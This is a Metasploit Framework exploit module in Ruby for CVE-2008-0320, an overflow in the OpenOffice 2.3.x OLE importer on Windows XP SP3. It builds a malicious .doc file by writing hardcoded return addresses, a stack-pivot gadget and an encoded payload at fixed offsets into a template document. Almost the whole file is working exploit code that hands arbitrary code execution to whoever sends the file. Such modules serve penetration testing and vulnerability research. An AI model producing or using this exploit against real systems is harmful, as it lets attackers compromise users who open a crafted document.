# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "OpenOffice OLE Importer DocumentSummaryInformation Stream Handling Overflow",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability in OpenOffice 2.3.1 and 2.3.0 on
        Microsoft Windows XP SP3.

        By supplying a OLE file with a malformed DocumentSummaryInformation stream, an
        attacker can gain control of the execution flow, which results arbitrary code
        execution under the context of the user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Marsu <Marsupilamipowa[at]hotmail.fr>&#039;, # Vulnerability discovery and PoC
          &#039;juan vazquez&#039;  # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2008-0320&#039;],
          [&#039;OSVDB&#039;, &#039;44472&#039;],
          [&#039;BID&#039;, &#039;28819&#039;],
          [&#039;EDB&#039;, &#039;5584&#039;],
          [&#039;URL&#039;, &#039;http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=694&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039; => 407
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039;          => &#039;process&#039;,
          &#039;DisablePayloadHandler&#039; => &#039;true&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [
            &#039;OpenOffice 2.3.1 / 2.3.0 on Windows XP SP3&#039;,
            {
              &#039;Ret&#039; => 0x609345fe, # add esp, ebx # ... # ret from tl680mi
              &#039;EBX&#039; => 0xffffefa8, # EBX value
              &#039;JmpEsp&#039; => 0x60915cbd, # push esp # ret from tl680mi
            }
          ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Apr 17 2008",
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;FILENAME&#039;, [true, &#039;The filename&#039;, &#039;msf.doc&#039;])
        ], self.class)
  end

  def exploit

    path = File.join(Msf::Config.install_root, &#039;data&#039;, &#039;exploits&#039;, &#039;CVE-2008-0320.doc&#039;)
    f = File.open(path, &#039;rb&#039;)
    template = f.read
    f.close

    my_payload = payload.encoded
    template[115717, 4] = [target[&#039;Ret&#039;]].pack("V")
    template[115725, 4] = [target[&#039;EBX&#039;]].pack("V")
    template[115729, 4] = [target[&#039;JmpEsp&#039;]].pack("V")
    template[115808, my_payload.length] = my_payload
    file_create(template)

  end

end



